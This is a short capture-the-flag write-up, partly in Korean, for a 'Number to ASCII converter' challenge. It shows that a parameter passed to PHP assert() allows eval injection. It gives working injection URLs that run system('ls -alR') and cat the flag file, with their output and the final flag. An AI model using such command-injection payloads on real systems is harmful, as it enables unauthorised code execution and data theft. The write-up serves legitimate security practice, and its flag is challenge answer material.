# [hackburger] Number to ASCII converter - Writeup

## Eval Injection

`number` 파라미터를 `assert()` 함수에 넣고 실행하므로, Eval Injection이 가능하다.

[http://burger.laboratorium.ee:8001/?number=system%28%27ls%20-alR%27%29%3B](http://burger.laboratorium.ee:8001/?number=system%28%27ls%20-alR%27%29%3B)
```
.:
total 16
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
-rwxr-xr-x 1 root root  495 Jul 24 07:09 index.php
drwxr-xr-x 1 root root 4096 Aug 29 11:55 where

./where:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 is

./where/is:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 the

./where/is/the:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 flag

./where/is/the/flag:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 i

./where/is/the/flag/i:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 am

./where/is/the/flag/i/am:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 looking

./where/is/the/flag/i/am/looking:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
drwxr-xr-x 1 root root 4096 Aug 29 11:55 for

./where/is/the/flag/i/am/looking/for:
total 12
drwxr-xr-x 1 root root 4096 Aug 29 11:55 .
drwxr-xr-x 1 root root 4096 Aug 29 11:55 ..
-rwxr-xr-x 1 root root   82 Jul 24 07:14 flag.php
Ascii character for system('ls -alR'); is
```

[http://burger.laboratorium.ee:8001/?number=system%28%27cat%20where/is/the/flag/i/am/looking/for/flag.php%27%29%3B](http://burger.laboratorium.ee:8001/?number=system%28%27cat%20where/is/the/flag/i/am/looking/for/flag.php%27%29%3B)
```
<?php

Congratulations!

The flag is adb92727cb7edc1802eb4616d23aef3ffaa928a4

?>
Ascii character for system('cat where/is/the/flag/i/am/looking/for/flag.php'); is
```

___

## Answer

flag: `adb92727cb7edc1802eb4616d23aef3ffaa928a4`